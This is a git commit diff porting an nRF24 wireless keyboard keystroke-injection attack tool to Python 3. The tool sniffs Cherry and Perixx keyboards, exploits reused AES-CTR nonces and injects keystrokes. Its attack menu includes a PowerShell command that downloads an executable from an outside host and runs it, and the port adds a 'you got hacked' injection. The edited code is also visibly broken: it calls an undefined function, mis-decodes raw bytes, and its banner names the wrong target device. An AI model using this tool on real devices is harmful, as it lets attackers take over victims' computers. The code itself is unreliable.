76dce975914b5d2371a4f3c1d3057ce188522c7d
Einstein2150 <Einstein2150@users.noreply.github.com>
2024-10-16 09:05:10 +0200

    python3

--- keystroke_injector.py
+++ keystroke_injector.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -24,28 +24,34 @@
 
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+  
+  (Fork - 2024)
+  This program has been developed and optimized for use with Python 3 
+  by Einstein2150. The author acknowledges that further development 
+  and enhancements may be made in the future. The use of this program is 
+  at your own risk, and the author accepts no responsibility for any damages 
+  that may arise from its use. Users are responsible for ensuring that their 
+  use of the program complies with all applicable laws and regulations.
+  
 """
 
-__version__ = '0.7'
-__author__ = 'Matthias Deeg, Gerhard Klostermeier'
+__version__ = '0.8'
+__author__ = 'Einstein2150'
 
 import argparse
 from binascii import hexlify, unhexlify
 from lib import nrf24, keyboard
 from time import sleep, time
-from sys import exit
+import sys
 
-
-SCAN_CHANNELS   = range(2, 84)              # channels to scan
-DWELL_TIME      = 0.1                       # dwell time for each channel in seconds
-SCAN_TIME       = 2                         # scan time in seconds for scan mode heuristics
-KEYSTROKE_DELAY = 0.01                      # keystroke delay in seconds
+SCAN_CHANNELS   = list(range(2, 84))             # channels to scan
+DWELL_TIME      = 0.1                            # dwell time for each channel in seconds
+SCAN_TIME       = 2                              # scan time in seconds for scan mode heuristics
+KEYSTROKE_DELAY = 0.01                           # keystroke delay in seconds
 
 # supported devices
 DEVICES = {
-    # Cherry Wireless Keyboard (e. g. wireless desktop set B.UNLIMITED AES)
     'cherry' : 'Cherry',
-    # Perixx Wireless Keyboard (e. g. wireless desktop set PERIDUO-710W)
     'perixx' : 'Perixx'
 }
 
@@ -53,21 +59,21 @@ DEVICES = {
 ATTACK_VECTORS = {
         1 : ("Open calc.exe", "calc"),
         2 : ("Open cmd.exe", "cmd"),
-        3 : ("Classic download & execute attack", u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'")
+        3 : ("Classic download & execute attack", "powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'")
 }
 
 def banner():
     """Show a fancy banner"""
-
     print("        _____  ______ ___  _  _     _____  _                      _  \n"
-"       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
-"  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
-" | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
-" | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
-" |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
-"                                                    __/ |             \n"
-"                                                   |___/              \n"
-"Keystroke Injector v{0} by Matthias Deeg - SySS GmbH (c) 2016".format(__version__))
+          "       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
+          "  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
+          " | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
+          " | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
+          " |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
+          "                                                    __/ |             \n"
+          "                                                   |___/              \n"
+        "Logitech Wireless Presenter Attack Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016\n"
+        "optimized for use with Python 3 by Einstein2150 (2024)\n".format(__version__))
 
 
 # main program
@@ -80,7 +86,6 @@ if __name__ == '__main__':
     parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
     parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')
     parser.add_argument('-d', '--device', type=str, help='Target device (supported: cherry, perixx)', required=True)
-#    parser.add_argument('-x', '--attack', type=str, help='Attack vector')
 
     # parse arguments
     args = parser.parse_args()
@@ -91,13 +96,13 @@ if __name__ == '__main__':
     if args.address:
         try:
             # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
-            address = args.address.replace(':', '').decode('hex')[::-1][:5]
-            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
+            address = bytes.fromhex(args.address.replace(':', ''))[::-1][:5]
+            address_string = ':'.join('{:02X}'.format(b) for b in address[::-1])
         except:
             print("[-] Error: Invalid address")
-            exit(1)
+            sys.exit(1)
     else:
-        address = ""
+        address = b""
 
     try:
         # initialize radio
@@ -108,7 +113,7 @@ if __name__ == '__main__':
         radio.enable_lna()
     except:
         print("[-] Error: Could not initialize nRF24 radio")
-        exit(1)
+        sys.exit(1)
 
     try:
         # set keyboard
@@ -120,7 +125,7 @@ if __name__ == '__main__':
             keyboard_device = keyboard.PerixxKeyboard
     except Exception:
         print("[-] Error: Unsupported device")
-        exit(1)
+        sys.exit(1)
 
     # put the radio in promiscuous mode with given address
     if len(address) > 0:
@@ -138,7 +143,7 @@ if __name__ == '__main__':
     while True:
         # increment the channel
         if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
-            channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
+            channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
             radio.set_channel(SCAN_CHANNELS[channel_index])
             last_tune = time()
 
@@ -146,22 +151,21 @@ if __name__ == '__main__':
         value = radio.receive_payload()
         if len(value) >= 10:
             # split the address and payload
-            address, payload = value[0:5], value[5:]
+            address, payload = value[:5], value[5:]
 
             # convert address to string and reverse byte order
-            converted_address = address[::-1].tostring()
-            address_string = ':'.join('{:02X}'.format(b) for b in address)
+            address_string = ':'.join('{:02X}'.format(b) for b in address[::-1])
             print("[+] Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))
 
             # ask user about device
-            answer = raw_input("[?] Attack this device (y/n)? ")
-            if answer[0] == 'y':
+            answer = input("[?] Attack this device (y/n)? ")
+            if answer.lower().startswith('y'):
                 break
             else:
                 print("[*] Continue scanning ...")
 
     # put the radio in sniffer mode (ESB w/o auto ACKs)
-    radio.enter_sniffer_mode(converted_address)
+    radio.enter_sniffer_mode(address[::-1])
     last_tune = time()
     channel_index = 0
     last_key = 0
@@ -169,12 +173,10 @@ if __name__ == '__main__':
 
     print("[*] Search for crypto key (actually a key release packet) ...")
     while True:
-        # Cherry does no channel hopping, so we stay tuned on the channel
-        # found previously
         if args.device != 'cherry':
             # increment the channel
             if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
-                channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
+                channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
                 radio.set_channel(SCAN_CHANNELS[channel_index])
                 last_tune = time()
 
@@ -191,9 +193,6 @@ if __name__ == '__main__':
             # increment packet count
             packet_count += 1
 
-            # show packet payload
-#            print('Received payload: {0}'.format(hexlify(payload)))
-
         # heuristic for having a valid release key data packet
         if packet_count >= 4 and time() - last_key > SCAN_TIME:
             break
@@ -208,41 +207,43 @@ if __name__ == '__main__':
         print("    0) Exit")
 
         try:
-            answer = int(raw_input("[?] Select keystroke injection attack: "))
+            answer = int(input("[?] Select keystroke injection attack: "))
             if answer == 0:
                 break
-            if answer in ATTACK_VECTORS.keys():
+            if answer in ATTACK_VECTORS:
                 attack_keystrokes = ATTACK_VECTORS[answer][1]
 
                 # keystroke injection
                 print("[*] Start keystroke injection ...")
 
-                # initialize keyboard with latest assumed key release packet to exploit
-                # AES-CTR crypto with reusable nonces
-                if args.device == 'cherry':
-                    kbd = keyboard_device(payload.tostring())
-                elif args.device == 'perixx':
-                    kbd = keyboard_device(payload.tostring())
+                # initialize keyboard with latest assumed key release packet to exploit AES-CTR crypto with reusable nonces
+                kbd = keyboard_device(payload.tobytes().decode('utf-8'))
 
                 # send keystrokes for chosen attack
+                
+                # Beispieltext, der injiziert werden soll
+                inject_text = "you got hacked"
+
+                # Initialisiere die Keystrokes
                 keystrokes = []
+
+                # Füge den injizierten Text zu den Keystrokes hinzu
+                keystrokes.extend(get_keystrokes_from_text(inject_text, kbd))  # kbd ist das Keyboard-Objekt
+                
+                #keystrokes = []
                 keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                 keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
                 keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
 
-                # send attack keystrokes
                 for k in keystrokes:
                     radio.transmit_payload(k)
                     sleep(KEYSTROKE_DELAY)
 
-                # need small delay after WIN + R
                 sleep(0.1)
 
-                keystrokes = []
                 keystrokes = kbd.getKeystrokes(attack_keystrokes)
                 keystrokes += kbd.getKeystroke(keyboard.KEY_RETURN)
 
-                # send attack keystrokes with a small delay
                 for k in keystrokes:
                     radio.transmit_payload(k)
                     sleep(KEYSTROKE_DELAY)
@@ -254,4 +255,3 @@ if __name__ == '__main__':
             print("[-] Invalid input")
 
     print("[*] Done with keystroke injections.\n    Have a nice day!")
-
